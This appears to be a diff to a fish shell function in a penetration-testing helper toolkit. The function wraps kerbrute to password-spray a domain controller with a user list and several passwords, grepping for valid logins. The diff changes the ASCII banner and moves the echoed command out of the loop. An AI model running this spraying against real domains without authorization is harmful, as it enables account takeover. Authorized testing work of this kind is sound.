@@ -3,9 +3,9 @@ function _ezpz_credspray
 
     # ASCII art banner
     echo ''
-    echo '  |               |  '(set_color magenta --bold)'   __|  _ \  __|  _ \  __/ '(set_color normal)
-    echo '   _|   -_) (_-<   _|'(set_color magenta --bold)'  (       /  _|   |  |  __/ '(set_color normal)
-    echo ' \__| \___| ___/ \__|'(set_color magenta --bold)' \___| _|_\ ___| ___/ \___| '(set_color normal)
+    echo '                    |'(set_color magenta --bold)'   __|  _ \ _ \    \ \ \  / '(set_color normal)
+    echo '   _|   _| -_)   _` |'(set_color magenta --bold)' \__ \  __/   /   _ \ \  /  '(set_color normal)
+    echo ' \__| _| \___| \__,_|'(set_color magenta --bold)' ____/ _|  _|_\ _/  _\ _|  '(set_color normal)
     echo ''
     
     # Usage message
@@ -119,13 +119,12 @@ Usage: ezpz credspray -t <target> -u <usersfile> [-p <password>] [-c <credsfile>
     end
 
     ezpz_header "Starting password spray against $_flag_target"
+    ezpz_cmd "kerbrute passwordspray --dc $_flag_target -d $_flag_domain $_flag_usersfile <PASSWORD>"
     ezpz_info "Passwords to test: "(count $passwords)
 
     # Run kerbrute for each password
     for password in $passwords
         ezpz_info "Testing password: $password"
-        ezpz_cmd "kerbrute passwordspray --dc $_flag_target -d $_flag_domain $_flag_usersfile $password"
-        
         kerbrute passwordspray --dc $_flag_target -d $_flag_domain $_flag_usersfile $password | grep -oE "VALID LOGIN.*"
     end
 
